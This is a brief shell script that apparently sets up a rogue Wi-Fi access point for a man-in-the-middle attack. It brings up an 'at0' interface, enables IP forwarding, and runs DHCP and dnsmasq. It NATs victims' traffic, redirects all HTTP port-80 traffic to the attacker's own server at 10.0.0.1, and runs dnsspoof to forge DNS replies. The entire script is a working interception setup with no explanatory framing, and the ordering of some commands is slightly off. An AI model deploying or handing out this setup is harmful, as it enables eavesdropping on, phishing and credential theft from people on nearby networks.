#!/bin/sh

name="wlan0"

ifconfig at0 10.0.0.1 up
ifconfig at0 10.0.0.1 netmask 255.255.255.0
echo 1 > /proc/sys/net/ipv4/ip_forward

cp dhcpd.conf /etc/dhcp/dhcpd.conf
dnsmasq -C dnsmasq.conf -d
killall dnsmasq dhcpd isc-dhcp-server
/etc/init.d/dnsmasq start

iptables --flush
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface at0 -j ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A POSTROUTING -j MASQUERADE

dnsspoof -i at0
